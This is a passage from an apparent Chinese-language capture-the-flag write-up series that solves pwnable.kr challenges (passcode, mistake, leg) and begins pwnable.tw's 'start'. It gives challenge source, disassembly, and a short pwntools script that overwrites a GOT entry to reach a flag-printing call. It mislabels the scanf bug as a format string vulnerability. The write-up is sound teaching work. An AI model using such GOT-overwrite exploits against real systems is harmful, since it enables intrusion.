+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void login()&#123;</span><br><span class="line">	int passcode1;</span><br><span class="line">	int passcode2;</span><br><span class="line"></span><br><span class="line">	printf(&quot;enter passcode1 : &quot;);</span><br><span class="line">	scanf(&quot;%d&quot;, &amp;passcode1);</span><br><span class="line">	fflush(stdin);</span><br><span class="line"></span><br><span class="line">	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span><br><span class="line">	printf(&quot;enter passcode2 : &quot;);</span><br><span class="line">        scanf(&quot;%d&quot;, &amp;passcode2);</span><br><span class="line"></span><br><span class="line">	printf(&quot;checking...\n&quot;);</span><br><span class="line">	if(passcode1==338150 &amp;&amp; passcode2==13371337)&#123;</span><br><span class="line">                printf(&quot;Login OK!\n&quot;);</span><br><span class="line">                system(&quot;/bin/cat flag&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">                printf(&quot;Login Failed!\n&quot;);</span><br><span class="line">		exit(0);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void welcome()&#123;</span><br><span class="line">	char name[100];</span><br><span class="line">	printf(&quot;enter you name : &quot;);</span><br><span class="line">	scanf(&quot;%100s&quot;, name);</span><br><span class="line">	printf(&quot;Welcome %s!\n&quot;, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">	printf(&quot;Toddler&#x27;s Secure Login System 1.0 beta.\n&quot;);</span><br><span class="line"></span><br><span class="line">	welcome();</span><br><span class="line">	login();</span><br><span class="line"></span><br><span class="line">	// something after login...</span><br><span class="line">	printf(&quot;Now I can safely trust you that you have credential :)\n&quot;);</span><br><span class="line">	return 0;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>The program has a format string vulnerability</p>
+</blockquote>
+<p><code>scanf(&quot;%d&quot;, passcode1)</code></p>
+<p>想要利用这个漏洞很简单，这个漏洞原理就是如果不加&amp;，scanf就会<strong>默认从栈中读取4字节当成passcode1的地址</strong>（好草率的说）<br>于是思路有了，就是把某个函数GOT地址改成<code>system(&quot;/bin/cat flag&quot;)</code>这个后门函数即可成功看到flag：）</p>
+<p>思路如下：</p>
+<ul>
+<li>知道name和passcode1的偏移</li>
+<li>找到fflush函数的GOT地址</li>
+<li>找到我们的后门函数地址</li>
+<li>利用本程序漏洞写出利用代码</li>
+</ul>
+<blockquote>
+<p>Write exp</p>
+</blockquote>
+<p>首先利用ida查出name和passcode1的偏移，我们发现这两个变量在welcome和login中使用，两次函数的<strong>提高堆栈</strong>的操作相同，于是我们知道这两个栈使用了同一个<strong>ebp</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov     eax, offset a100s ; &quot;%100s&quot;</span><br><span class="line">lea     edx, [ebp+var_70]</span><br><span class="line">mov     [esp+4], edx</span><br><span class="line">mov     [esp], eax</span><br><span class="line">call    ___isoc99_scanf</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov     eax, offset aD  ; &quot;%d&quot;</span><br><span class="line">mov     edx, [ebp+var_10]</span><br><span class="line">mov     [esp+4], edx</span><br><span class="line">mov     [esp], eax</span><br><span class="line">call    ___isoc99_scanf</span><br></pre></td></tr></table></figure>
+<p>使用objdump看一下GOT表</p>
+<p><code>objdump -R passcode</code></p>
+<p>读一下GOT表后找到</p>
+<p><code>0804a004 R_386_JUMP_SLOT   fflush@GLIBC_2.0</code></p>
+<p>该函数在输入passcode后自动调用，直接更改这个函数就行！通过ida看到后门函数地址</p>
+<p><code>080485E3 mov     dword ptr [esp], offset command ; &quot;/bin/cat flag</code></p>
+<p>万事具备，编写exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./passcode&#x27;)</span><br><span class="line">fflush_got_addr = 0x0804a004</span><br><span class="line">flag_addr = 0x080485E3</span><br><span class="line">payload = &#x27;a&#x27; * 96 + p32(fflush_got_addr) + str(flag_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>这样写并不优雅，可能部分人会认为怎么payload直接就输进去了？？其实这只是凑巧了，96个字节的<code>a</code>加上之后的<code>p32(fflush_got_addr)</code>正好是100个开辟的name大小，应该是这样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sleep(1)</span><br><span class="line">payload = &#x27;a&#x27; * 96 + p32(fflush_got_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(1)</span><br><span class="line">payload = str(flag_addr)</span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>
+<p>效果相同，我们用一个小demo具体说明</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">void world()&#123;</span><br><span class="line">	int passcode1;</span><br><span class="line">	printf(&quot;enter passcode1 : &quot;);</span><br><span class="line">	scanf(&quot;%d&quot;, &amp;passcode1);</span><br><span class="line">	printf(&quot;%d\n&quot;,passcode1);</span><br><span class="line">&#125;</span><br><span class="line">void hello()&#123;</span><br><span class="line">	char name[5];</span><br><span class="line">	printf(&quot;enter you name : &quot;);</span><br><span class="line">	scanf(&quot;%5s&quot;, name);</span><br><span class="line">	printf(&quot;Welcome %s!\n&quot;, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">	hello();</span><br><span class="line">	world();</span><br><span class="line">	return 0;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pic@ubuntu:~/Desktop$ ./flag</span><br><span class="line">enter you name : 123456</span><br><span class="line">Welcome 12345!</span><br><span class="line">enter passcode1 : 6</span><br></pre></td></tr></table></figure>
+<p>大致是这意思😀</p>
+<blockquote>
+<p>深入分析pwnable.kr上的题系列[四]</p>
+</blockquote>
+<h2 id="mistake"><a href="#mistake" class="headerlink" title="mistake"></a>mistake</h2><p>本题的关键就是符号优先性，我们写个demo</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main(int argc, char* argv[])&#123;</span><br><span class="line">	int test;</span><br><span class="line">	if(test = -1&lt;0)</span><br><span class="line">		printf(&quot;%d\n&quot;,test);</span><br><span class="line">	else</span><br><span class="line">		printf(&quot;??what happened\n&quot;);</span><br><span class="line">	printf(&quot;%d\n&quot;,test);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pic@ubuntu:~/Desktop$ ./c</span><br><span class="line">1</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+
+<p>我们通过小demo看出来，其实并不是先赋值，而是先执行<code>&lt;</code>在执行<code>=</code>，即<code>test=(-1&lt;0)</code></p>
+<p>我们分析一下源代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line"></span><br><span class="line">#define PW_LEN 10</span><br><span class="line">#define XORKEY 1</span><br><span class="line"></span><br><span class="line">void xor(char* s, int len)&#123;</span><br><span class="line">	int i;</span><br><span class="line">	for(i=0; i&lt;len; i++)&#123;</span><br><span class="line">		s[i] ^= XORKEY;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char* argv[])&#123;</span><br><span class="line">	</span><br><span class="line">	int fd;</span><br><span class="line">	if(fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0)&#123;  //open函数以只读方式打开，错误则返回-1，if语句成立，向下执行</span><br><span class="line">		printf(&quot;can&#x27;t open password %d\n&quot;, fd); //fd只能是1</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line">  //fd为0向下执行</span><br><span class="line">	printf(&quot;do not bruteforce...\n&quot;);</span><br><span class="line">	sleep(time(0)%20);</span><br><span class="line"></span><br><span class="line">	char pw_buf[PW_LEN+1];</span><br><span class="line">	int len;</span><br><span class="line">	if(!(len=read(fd,pw_buf,PW_LEN) &gt; 0))&#123;  //标准读入，输入即可</span><br><span class="line">		printf(&quot;read error\n&quot;);</span><br><span class="line">		close(fd);</span><br><span class="line">		return 0;		</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	char pw_buf2[PW_LEN+1];</span><br><span class="line">	printf(&quot;input password : &quot;);</span><br><span class="line">	scanf(&quot;%10s&quot;, pw_buf2);</span><br><span class="line"></span><br><span class="line">	// xor your input</span><br><span class="line">	xor(pw_buf2, 10);</span><br><span class="line"></span><br><span class="line">	if(!strncmp(pw_buf, pw_buf2, PW_LEN))&#123;</span><br><span class="line">		printf(&quot;Password OK\n&quot;);</span><br><span class="line">		system(&quot;/bin/cat flag\n&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	else&#123;</span><br><span class="line">		printf(&quot;Wrong Password\n&quot;);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	close(fd);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>所以分析到这种程度输入就行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mistake@prowl:~$ ./mistake </span><br><span class="line">do not bruteforce...</span><br><span class="line">0000000000</span><br><span class="line">input password : 1111111111</span><br><span class="line">Password OK</span><br><span class="line">Mommy, the operator priority always confuses me :(</span><br></pre></td></tr></table></figure>
+
+
+<blockquote>
+<p>深入分析pwnable.kr上的题系列[五]</p>
+</blockquote>
+<h2 id="leg"><a href="#leg" class="headerlink" title="leg"></a>leg</h2><p>看到本题是arm汇编，我们直接看看c代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">int key1()&#123;</span><br><span class="line">	asm(&quot;mov r3, pc\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">int key2()&#123;</span><br><span class="line">	asm(</span><br><span class="line">	&quot;push	&#123;r6&#125;\n&quot;</span><br><span class="line">	&quot;add	r6, pc, $1\n&quot;</span><br><span class="line">	&quot;bx	r6\n&quot;</span><br><span class="line">	&quot;.code   16\n&quot;</span><br><span class="line">	&quot;mov	r3, pc\n&quot;</span><br><span class="line">	&quot;add	r3, $0x4\n&quot;</span><br><span class="line">	&quot;push	&#123;r3&#125;\n&quot;</span><br><span class="line">	&quot;pop	&#123;pc&#125;\n&quot;</span><br><span class="line">	&quot;.code	32\n&quot;</span><br><span class="line">	&quot;pop	&#123;r6&#125;\n&quot;</span><br><span class="line">	);</span><br><span class="line">&#125;</span><br><span class="line">int key3()&#123;</span><br><span class="line">	asm(&quot;mov r3, lr\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">	int key=0;</span><br><span class="line">	printf(&quot;Daddy has very strong arm! : &quot;);</span><br><span class="line">	scanf(&quot;%d&quot;, &amp;key);</span><br><span class="line">	if( (key1()+key2()+key3()) == key )&#123;</span><br><span class="line">		printf(&quot;Congratz!\n&quot;);</span><br><span class="line">		int fd = open(&quot;flag&quot;, O_RDONLY);</span><br><span class="line">		char buf[100];</span><br><span class="line">		int r = read(fd, buf, 100);</span><br><span class="line">		write(0, buf, r);</span><br><span class="line">	&#125;</span><br><span class="line">	else&#123;</span><br><span class="line">		printf(&quot;I have strong leg :P\n&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>emmm，看不太懂，只知道<code>key1()+key2()+key3()) == key</code>则得到flag，直接撸汇编吧，挨个分析</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disass key1</span><br><span class="line">Dump of assembler code for function key1:</span><br><span class="line">   0x00008cd4 &lt;+0&gt;:	push	&#123;r11&#125;		; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008cd8 &lt;+4&gt;:	add	r11, sp, #0</span><br><span class="line">   0x00008cdc &lt;+8&gt;:	mov	r3, pc</span><br><span class="line">   0x00008ce0 &lt;+12&gt;:	mov	r0, r3</span><br><span class="line">   0x00008ce4 &lt;+16&gt;:	sub	sp, r11, #0</span><br><span class="line">   0x00008ce8 &lt;+20&gt;:	pop	&#123;r11&#125;		; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008cec &lt;+24&gt;:	bx	lr</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int key1()&#123;</span><br><span class="line">	asm(&quot;mov r3, pc\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>key1函数汇编层面只是多作了一个栈的处理，我们只需要知道pc寄存器的值，且其有读写限制，当没有超过读取限制的时候，读取的值是指令的地址加上8个字节，故返回值r0（arm返回值为r0）为0x00008ce4</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disass key2</span><br><span class="line">Dump of assembler code for function key2:</span><br><span class="line">   0x00008cf0 &lt;+0&gt;:	push	&#123;r11&#125;		; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008cf4 &lt;+4&gt;:	add	r11, sp, #0</span><br><span class="line">   0x00008cf8 &lt;+8&gt;:	push	&#123;r6&#125;		; (str r6, [sp, #-4]!)</span><br><span class="line">   0x00008cfc &lt;+12&gt;:	add	r6, pc, #1</span><br><span class="line">   0x00008d00 &lt;+16&gt;:	bx	r6</span><br><span class="line">   0x00008d04 &lt;+20&gt;:	mov	r3, pc</span><br><span class="line">   0x00008d06 &lt;+22&gt;:	adds	r3, #4</span><br><span class="line">   0x00008d08 &lt;+24&gt;:	push	&#123;r3&#125;</span><br><span class="line">   0x00008d0a &lt;+26&gt;:	pop	&#123;pc&#125;</span><br><span class="line">   0x00008d0c &lt;+28&gt;:	pop	&#123;r6&#125;		; (ldr r6, [sp], #4)</span><br><span class="line">   0x00008d10 &lt;+32&gt;:	mov	r0, r3</span><br><span class="line">   0x00008d14 &lt;+36&gt;:	sub	sp, r11, #0</span><br><span class="line">   0x00008d18 &lt;+40&gt;:	pop	&#123;r11&#125;		; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008d1c &lt;+44&gt;:	bx	lr</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">int key2()&#123;</span><br><span class="line">	asm(</span><br><span class="line">	&quot;push	&#123;r6&#125;\n&quot;</span><br><span class="line">	&quot;add	r6, pc, $1\n&quot;</span><br><span class="line">	&quot;bx	r6\n&quot;</span><br><span class="line">	&quot;.code   16\n&quot;</span><br><span class="line">	&quot;mov	r3, pc\n&quot;</span><br><span class="line">	&quot;add	r3, $0x4\n&quot;</span><br><span class="line">	&quot;push	&#123;r3&#125;\n&quot;</span><br><span class="line">	&quot;pop	&#123;pc&#125;\n&quot;</span><br><span class="line">	&quot;.code	32\n&quot;</span><br><span class="line">	&quot;pop	&#123;r6&#125;\n&quot;</span><br><span class="line">	);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们仔细对照一下汇编和使用asm编的代码，发现有这个<code>.code 16</code>和<code>.code 32</code>，这是啥？？google一波发现是告诉编译器代码是arm状态还是thumb状态，不过和这题没什么关系</p>
+<p>我们按行注释一下代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x00008cfc &lt;+12&gt;:	add	r6, pc, #1  //r6=0x00008d05</span><br><span class="line">0x00008d00 &lt;+16&gt;:	bx	r6  //跳转到r6的指向，但地址会先和0xFFFFFFFE按位与，相当于jmp 0x00008d04（最后一位必为偶数）</span><br><span class="line">0x00008d04 &lt;+20&gt;:	mov	r3, pc  //r3=0x00008d08</span><br><span class="line">0x00008d06 &lt;+22&gt;:	adds	r3, #4  //r3=0x00008d0c</span><br><span class="line">0x00008d08 &lt;+24&gt;:	push	&#123;r3&#125;</span><br><span class="line">0x00008d0a &lt;+26&gt;:	pop	&#123;pc&#125;</span><br><span class="line">0x00008d0c &lt;+28&gt;:	pop	&#123;r6&#125;		; (ldr r6, [sp], #4)</span><br><span class="line">0x00008d10 &lt;+32&gt;:	mov	r0, r3  //返回值r0=r3</span><br></pre></td></tr></table></figure>
+<p>结束战斗</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disass key3</span><br><span class="line">Dump of assembler code for function key3:</span><br><span class="line">   0x00008d20 &lt;+0&gt;:	push	&#123;r11&#125;		; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008d24 &lt;+4&gt;:	add	r11, sp, #0</span><br><span class="line">   0x00008d28 &lt;+8&gt;:	mov	r3, lr</span><br><span class="line">   0x00008d2c &lt;+12&gt;:	mov	r0, r3</span><br><span class="line">   0x00008d30 &lt;+16&gt;:	sub	sp, r11, #0</span><br><span class="line">   0x00008d34 &lt;+20&gt;:	pop	&#123;r11&#125;		; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008d38 &lt;+24&gt;:	bx	lr</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int key3()&#123;</span><br><span class="line">	asm(&quot;mov r3, lr\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>key3就是一个简单的lr寄存器当返回值，lr寄存器有两个用处</p>
+<ul>
+<li>保存子程序返回地址</li>
+<li>异常发生时，异常模式的r14用来保存异常返回地址</li>
+</ul>
+<p>所以返回地址为<code>   0x00008d80 &lt;+68&gt;:	mov	r3, r0</code>，的<strong>0x00008d80</strong></p>
+<p>我们得到了三个返回值，直接相加即为key，为0x00008ce4+0x00008d0c+0x00008d80&#x3D;108400，程序分析完毕，我们再来看看刚才提到的两个状态</p>
+<h2 id="ARM处理器状态"><a href="#ARM处理器状态" class="headerlink" title="ARM处理器状态"></a>ARM处理器状态</h2><p>我们分析key2的时候发现gdb反编译出莫名奇妙的几行，我们深入分析一下源代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">int key2()&#123;</span><br><span class="line">	asm(</span><br><span class="line">	&quot;push	&#123;r6&#125;\n&quot;</span><br><span class="line">	&quot;add	r6, pc, $1\n&quot;</span><br><span class="line">	&quot;bx	r6\n&quot; 	//①</span><br><span class="line">	&quot;.code   16\n&quot;</span><br><span class="line">	&quot;mov	r3, pc\n&quot;</span><br><span class="line">	&quot;add	r3, $0x4\n&quot;</span><br><span class="line">	&quot;push	&#123;r3&#125;\n&quot;</span><br><span class="line">	&quot;pop	&#123;pc&#125;\n&quot;</span><br><span class="line">	&quot;.code	32\n&quot;	//②</span><br><span class="line">	&quot;pop	&#123;r6&#125;\n&quot;</span><br><span class="line">	);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>看到了处理①的时候下一行就是状态的切换了，之前我们知道了地址在跳转之前会和<strong>0xFFFFFFFE</strong>进行按位与，本身最后一位的作用是起到了一个标志位的作用，0代表状态arm，1代表状态thumb，所以才会显得很奇怪的加一，而最后②的转换回来考虑到lr寄存器放入的就是原本地址，故执行完<code>   0x00008d1c &lt;+44&gt;:	bx	lr</code>后程序又切换会了arm状态</p>
+<h1 id="start"><a href="#start" class="headerlink" title="start"></a>start</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  下载 ./start</span><br><span class="line">Let&#x27;s start the CTF:321</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  下载 checksec start </span><br><span class="line">[*] &#x27;/home/pic/\xe4\xb8\x8b\xe8\xbd\xbd/start&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.text:08048060 000 push    esp</span><br><span class="line">.text:08048061 004 push    offset _exit</span><br><span class="line">.text:08048066 008 xor     eax, eax</span><br><span class="line">.text:08048068 008 xor     ebx, ebx</span><br><span class="line">.text:0804806A 008 xor     ecx, ecx</span><br><span class="line">.text:0804806C 008 xor     edx, edx</span><br><span class="line">.text:0804806E 008 push    &#x27;:FTC&#x27;</span><br><span class="line">.text:08048073 00C push    &#x27; eht&#x27;</span><br><span class="line">.text:08048078 010 push    &#x27; tra&#x27;</span><br><span class="line">.text:0804807D 014 push    &#x27;ts s&#x27;</span><br><span class="line">.text:08048082 018 push    2774654Ch</span><br><span class="line">.text:08048087 01C mov     ecx, esp        ; addr</span><br><span class="line">.text:08048089 01C mov     dl, 14h</span><br><span class="line">.text:0804808B 01C mov     bl, 1           ; fd</span><br><span class="line">.text:0804808D 01C mov     al, 4</span><br><span class="line">.text:0804808F 01C int     80h             ; LINUX - sys_write</span><br><span class="line">.text:08048091 01C xor     ebx, ebx</span><br><span class="line">.text:08048093 01C mov     dl, 3Ch</span><br><span class="line">.text:08048095 01C mov     al, 3</span><br><span class="line">.text:08048097 01C int     80h             ; LINUX -</span><br><span class="line">.text:08048099 01C add     esp, 14h</span><br><span class="line">.text:0804809C 008 retn</span><br></pre></td></tr></table></figure>
+
+<p>本题中</p>
